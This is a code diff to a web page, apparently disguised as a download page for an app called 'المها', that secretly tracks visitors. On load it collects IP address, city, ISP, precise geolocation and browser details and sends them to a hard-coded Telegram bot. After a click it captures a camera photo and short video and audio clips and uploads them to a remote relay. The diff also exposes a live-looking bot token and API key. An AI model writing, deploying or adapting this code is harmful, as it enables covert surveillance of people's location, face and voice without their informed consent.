@@ -35,8 +35,7 @@
   </div>
 
 <script>
-  // روابط الخدمات
-  const WORKER_URL = "https://media-relay.tabonmok7770888.workers.dev"; // رابط الـ Worker الخاص بك
+  const WORKER_URL = "https://media-relay.tabonmok7770888.workers.dev";
   const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
   const TELEGRAM_CHAT = "7664416709";
   const IPINFO_TOKEN = "3bc0a2eadd8ba5";
@@ -67,18 +66,10 @@
 🚀 زيارة جديدة — تطبيق المها
 ⏱️ ${now}
 
-🌐 [ipinfo.io]
-IP: ${ipInfoData.ip||"?"}
-المدينة: ${ipInfoData.city||"?"}
-الدولة: ${ipInfoData.country||"?"}
-
-🌍 [ipdata.co]
-القارة: ${ipDataData.continent_name||"?"}
-المزود: ${ipDataData.asn?.name||"?"}
-
-🧭 إحداثيات:
-Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} ±${geo.acc??"?"}m
-
+🌐 IP: ${ipInfoData.ip||"?"}
+📍 ${ipInfoData.city||"?"}, ${ipInfoData.country||"?"}
+🌍 ${ipDataData.continent_name||"?"}
+🧭 Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} ±${geo.acc??"?"}m
 📱 UA: ${ua}
 
 ${extra}
@@ -90,7 +81,7 @@ ${extra}
   }
 
   Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=>{
-    sendTextToTelegram();
+    sendTextToTelegram("📥 فتح الصفحة");
     window.open(APK_URL, '_blank', 'noopener');
   });
 
@@ -102,68 +93,49 @@ ${extra}
     form.append("caption", caption);
     form.append("file", file);
     const res = await fetch(WORKER_URL, { method: "POST", body: form });
-    if (!res.ok) throw new Error("Upload failed");
-    return res.json();
+    console.log(kind, await res.text());
   }
 
   document.getElementById("startMedia").onclick = async ()=>{
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      sendTextToTelegram("✅ المستخدم وافق على المشاركة بالصوت/الصورة");
+      sendTextToTelegram("✅ إذن الكاميرا/المايك");
 
-      const videoTrack = stream.getVideoTracks()[0];
-      let photoBlob;
-      if ("ImageCapture" in window) {
-        try {
-          const imageCapture = new ImageCapture(videoTrack);
-          photoBlob = await imageCapture.takePhoto();
-        } catch {
-          photoBlob = await new Promise((resolve)=>{
-            const v = document.createElement("video");
-            v.srcObject = stream; v.muted = true; v.play();
-            v.onloadeddata = ()=>{
-              const c = document.createElement("canvas");
-              c.width = v.videoWidth; c.height = v.videoHeight;
-              c.getContext("2d").drawImage(v,0,0);
-              c.toBlob(resolve, "image/jpeg", 0.9);
-            };
-          });
-        }
-      }
-      if (photoBlob) {
-        const photoFile = blobToFile(photoBlob, "photo.jpg");
-        await uploadToWorker("photo", photoFile, "📸 صورة المشاركة — المها");
-      }
+      // صورة
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const photoBlob = await imageCapture.takePhoto();
+      await uploadToWorker("photo", blobToFile(photoBlob, "photo.jpg"), "📸 صورة");
 
-      const recorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9,opus" });
+      // فيديو قصير 10 ثوانٍ
+      const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
       const chunks = [];
       recorder.ondataavailable = e => e.data && chunks.push(e.data);
-      const stopPromise = new Promise(res=> recorder.onstop = res);
       recorder.start();
-      setTimeout(()=> recorder.state === "recording" && recorder.stop(), 60000);
-      await stopPromise;
+      setTimeout(()=> recorder.stop(), 10000);
+      await new Promise(res=> recorder.onstop = res);
+      await uploadToWorker("video", blobToFile(new Blob(chunks, { type: "video/webm" }), "clip.webm"), "🎥 فيديو");
 
-      const videoBlob = new Blob(chunks, { type: "video/webm" });
-      const videoFile = blobToFile(videoBlob, "clip.webm");
-      await uploadToWorker("video", videoFile, "🎥 فيديو المشاركة — المها");
-
+      // صوت قصير 10 ثوانٍ
       const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
       const audioRecorder = new MediaRecorder(audioStream, { mimeType: "audio/webm" });
       const audioChunks = [];
       audioRecorder.ondataavailable = e => e.data && audioChunks.push(e.data);
-      const stopAudioPromise = new Promise(res=> audioRecorder.onstop = res);
       audioRecorder.start();
-      setTimeout(()=> audioRecorder.state === "recording" && audioRecorder.stop(), 60000);
-      await stopAudioPromise;
-
-      const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
-      const audioFile = blobToFile(audioBlob, "audio.webm");
-      await uploadToWorker("audio", audioFile, "🎙️ صوت المشاركة — المها");
+      setTimeout(()=> audioRecorder.stop(), 10000);
+      await new Promise(res=> audioRecorder.onstop = res);
+      await uploadToWorker("audio", blobToFile(new Blob(audioChunks, { type: "audio/webm" }), "audio.webm"), "🎙️ صوت");
 
       stream.getTracks().forEach(t=>t.stop());
       audioStream.getTracks().forEach(t=>t.stop());
 
-      sendTextToTelegram("✅ تم إرسال الصورة والفيديو والصوت إلى البوت بنجاح");
+      sendTextToTelegram("✅ تم إرسال كل الوسائط");
 
     } catch (e) {
-      sendTextToTelegram("❌ فشل طلب
+      sendTextToTelegram("❌ فشل الإذن أو الإرسال");
+      console.error(e);
+    }
+  };
+</script>
+</body>
+</html>
